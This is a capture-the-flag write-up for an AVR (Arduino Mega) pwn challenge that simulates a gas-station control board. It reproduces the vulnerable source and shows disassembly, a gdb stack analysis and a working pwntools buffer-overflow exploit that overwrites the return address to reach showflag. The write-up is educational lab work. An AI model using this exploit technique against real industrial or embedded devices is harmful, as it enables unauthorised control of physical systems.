---
title: reto20
challenge_type: Pwn
difficulty: Insane
author: "@4nimanegra"
writeup_author: "@xabito"
competition: navarra-cyber-talent-25-4
summary: |-
  We have an industrial control board for a gas station managed by an Arduino Mega. The serial port is connected to a socket that we can connect to in order to communicate with it.
attachments:
  - title: challenge.ino.elf
    url: /assets/files/navarra-cyber-talent-25-4/reto20/challenge.ino.elf
  - title: challenge.c
    url: /assets/files/navarra-cyber-talent-25-4/reto20/challenge.c
connections:
  - url: nct25.thehackerconclave.es:26020
---

**Note:** This challenge was solved after the competition had ended, so we no longer had access to the socket. As a result, we had to execute the binary locally and were only able to obtain the dummy placeholder flag instead of the real one.

## Recon

In this challenge, we are given an **Arduino Mega** (also known as the `atmega2560`) binary along with its source code. When emulated, the program presents a menu with several options, each displaying different information before returning to the menu. Notably, the fourth option is of particular interest, as it prompts the user for a password.

```bash
$ qemu-system-avr \
    -machine mega2560 \
    -bios challenge.ino.elf \
    -nographic \
    -serial tcp:127.0.0.1:4444,server,nowait &

$ nc 127.0.0.1 4444
===== PLC Gasolinera =====
1. Ver niveles de tanques
2. Estado de bombas
3. Historial de entregas
4. Cambiar precios (requiere password)
5. Salir

Selecciona opcion: 4
4

*** Acceso restringido ***
Introduce password: test

Incorrect password!!
```

Let's review the important bits of code required to exploit the binary and expose the flag:

```c
int lalala=42;

void showflag(){
  Serialprintln("\n\rWelcome to the system");
  Serialprintln("\n\rC0nclave{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}");
}

void readPass(){
  char caracter;
  int indice;
  int userend;
  char entrada[32];
  userend=0;
  indice=0;
  while(userend != 1){
    while (Serialavailable() == 0) {_delay_ms(50);}
    caracter = Serialread();
    if ((caracter == '\r') || (caracter == '\n')) {
      entrada[indice] = '\0';
      userend=1;
      if (lalala == 388) {
        showflag();
        indice = 0;
      } else {
        Serialprintln("\n\rIncorrect password!!");
        indice = 0;
      }
    } else {
      Serialsend('*');
      entrada[indice] = caracter;
      indice=indice+1;
    }
  }
}

void cambiarPrecios(){
  Serialprintln("\n\r*** Acceso restringido ***");
  Serialprint("Introduce password: ");
  readPass();
}

void loop(){
  char opcion;
  while(1){
    menuOpciones();
    while(Serialavailable()==0){_delay_ms(50);}
    opcion = Serialread();
    while(Serialread() != '\n'){
      _delay_ms(50);
    }
    Serialsend(opcion);
    Serialprintln("");
    switch(opcion){
      case '1': verTanques(); break;
      case '2': estadoBombas(); break;
      case '3': historialEntregas(); break;
      case '4': cambiarPrecios(); break;
      case '5': Serialprintln("\n\rSaliendo al menu principal..."); return;
      default: Serialprintln("\n\rOpcion invalida."); break;
    }
  }
}
```

Although this challenge may initially appear more complex than [reto19](/competitions/navarra-cyber-talent-25-4/reto19/), the fundamental vulnerability remains unchanged: there is a straightforward **buffer overflow** in the way user input is handled. Even though the vulnerability in the `loop` function has been fixed, the same issue still exists within the `readPass` function.

At first glance, the presence of the `if (lalala == 388) {` statement might lead one to believe that we need to overwrite the global integer variable `lalala` in order to trigger the `showflag` function. However, this is not the case. The presence of a buffer overflow allows us to overwrite the saved return address on the stack, thereby hijacking execution flow to another function, such as `showflag`.

Unlike in `reto19`, where the vulnerable buffer was located in a different stack frame, here the target variable `char entrada[32]` is declared within the same function where the overflow occurs.

## Exploitation

We just need to retrieve the starting address of the `showflag` function:

```
$ avr-nm challenge.ino.elf | grep showflag
00000742 T showflag
```

The address of `showflag` is `0x000742`. It is important to note that the Arduino Mega uses 3-byte return addresses (22-bits to be precise), unlike smaller devices that use only two. Additionally, the program counter operates in word addressing mode, so we must divide the byte address by two before writing it to the stack: `0x000742 / 2 = 0x0003a1`. Furthermore, although the architecture is little-endian, return addresses are stored on the stack in big-endian order due to the push sequence. Keep these details in mind when crafting the exploit payload.

Next, we need to examine the disassembly of the `cambiarPrecios` and `readPass` functions to understand the stack layout. This will allow us to determine the exact number of bytes required to overflow the buffer and reach the saved return address.

```bash
$ avr-objdump --disassemble=cambiarPrecios challenge.ino.elf
0000071e <cambiarPrecios>:
  71e:  cf 93          push    r28
  720:  df 93          push    r29
  722:  cd b7          in      r28, 0x3d    ; 61
  724:  de b7          in      r29, 0x3e    ; 62
  726:  85 ed          ldi     r24, 0xD5    ; 213
  728:  93 e0          ldi     r25, 0x03    ; 3
  72a:  0e 94 06 01    call    0x20c        ; 0x20c <Serialprintln>
  72e:  82 ef          ldi     r24, 0xF2    ; 242
  730:  93 e0          ldi     r25, 0x03    ; 3
  732:  0e 94 e6 00    call    0x1cc        ; 0x1cc <Serialprint>
  736:  0e 94 3c 01    call    0x278        ; 0x278 <readPass>       # push ret to stack
  73a:  00 00          nop                                           # expected ret address in stack
  73c:  df 91          pop     r29
  73e:  cf 91          pop     r28
  740:  08 95          ret

$ avr-objdump --disassemble=readPass challenge.ino.elf
00000278 <readPass>:
  5ba:  cf 93          push    r28                                   # push r28 to stack
  5bc:  df 93          push    r29                                   # push r29 to stack
  27c:  cd b7          in      r28, 0x3d    ; 61
  27e:  de b7          in      r29, 0x3e    ; 62
  280:  e3 97          sbiw    r28, 0x33    ; 51                     # memory reservation for locals
  ... 
  384:  0e 94 2c 01    call    0x258        ; 0x258 <Serialread>     # read user input from uart
  ...
  3cc:  0e 94 06 01    call    0x20c        ; 0x20c <Serialprintln>  # claim password is incorrect
  ...
  416:  08 95          ret                                           # will jump to ret address
```

We will debug the program and inspect the stack before and after the user input is written. This approach will help us determine the exact placement of our input in memory. To start the debugging session, use the following commands:

```bash
$ qemu-system-avr \
    -machine mega2560 \
    -bios challenge.ino.elf \
    -nographic \
    -serial tcp:127.0.0.1:4444,server,nowait \
    -S -gdb tcp::1234 &

$ avr-gdb challenge.ino.elf
(gdb) target remote :1234
Remote debugging using :1234
```

First, we set breakpoints at `0x000384`, just before the first serial byte is read, and on `0x0003cc`, after password has been checked. Then, we connect to the program using `nc 127.0.0.1 4444` in a separate terminal, select option `4`, and enter a password. The output below shows the results of the `gdb` debugging session:


```bash
(gdb) break *0x384
(gdb) break *0x3cc
(gdb) continue
Continuing.
(gdb) # select option 4 from the menu and write password AAAA
Breakpoint 1, 0x00000384 in readPass ()
(gdb) x/64bx $sp
0x80219b:  0xbf  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x8021a3:  0x48  0x42  0x00  0x50  0x43  0x48  0x00  0x00
0x8021ab:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x8021b3:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x8021bb:  0x00  0x00  0x00  0x00  0x00  0x2a  0x21  0xc5
0x8021c3:  0x00  0x00  0xfa  0xf1  0x20  0x21  0xcc  0x00
0x8021cb:  0x00  0xfa  0x06  0x04  0x21  0xd3  0x00  0x03
0x8021d3:  0x9d  0x21  0xd8  0x00  0x04  0xe9  0x00  0x00
(gdb) del 1
(gdb) continue
Breakpoint 2, 0x000003cc in readPass ()
(gdb) x/64bx $sp
0x80219b:  0xc4  0x04  0x00  0x01  0x00  0x0a  0x00  0x00
0x8021a3:  0x48  0x42  0x00  0x50  0x43  0x48  0x00  0x00
0x8021ab:  0x00  0x00  0x00  0x00  0x41  0x41  0x41  0x41
0x8021b3:  0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x8021bb:  0x00  0x00  0x00  0x00  0x00  0x2a  0x21  0xc5
0x8021c3:  0x00  0x00  0xfa  0xf1  0x20  0x21  0xcc  0x00
0x8021cb:  0x00  0xfa  0x06  0x04  0x21  0xd3  0x00  0x03
0x8021d3:  0x9d  0x21  0xd8  0x00  0x04  0xe9  0x00  0x00
```

Our password (the sequence of `0x41` bytes) begins at address `0x8021b0`. We also observe that the saved return address (`0x00073a / 2 = 0x00039d`) is located at `0x8021d1`. This confirms that we must write exactly 34 bytes before overwriting the saved return address.

**Note:** Keep in mind that the AVR architecture employs a post-increment stack mechanism when pushing values onto the stack. As a result, there is an extra byte at the start of the stack pointer.

The following Python script transmits the payload as outlined above:

```python
from pwn import *

context.arch = 'avr'
context.log_level = 'info'

showflag_addr = 0x000742 // 2

p = remote('127.0.0.1', 4444)

p.recvuntil(b'Selecciona opcion: ', timeout=5)
p.sendline(b'4')

p.recvuntil(b'Introduce password: ')
p.sendline(b'A'*34 + pack(showflag_addr, 24, 'big'))

response = p.recvall(timeout=0.5)

flag_match = re.search(rb'C0nclave\{[^}]+\}', response)
if flag_match:
    flag = flag_match.group(0).decode()
    log.success(f'Flag: {flag}')
```

## Flag capture

Running the exploit successfully yields the flag:

```
[+] Opening connection to 127.0.0.1 on port 4444: Done
[+] Receiving all data: Done (132B)
[*] Closed connection to 127.0.0.1 port 4444
[+] Flag: C0nclave{XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX}
```
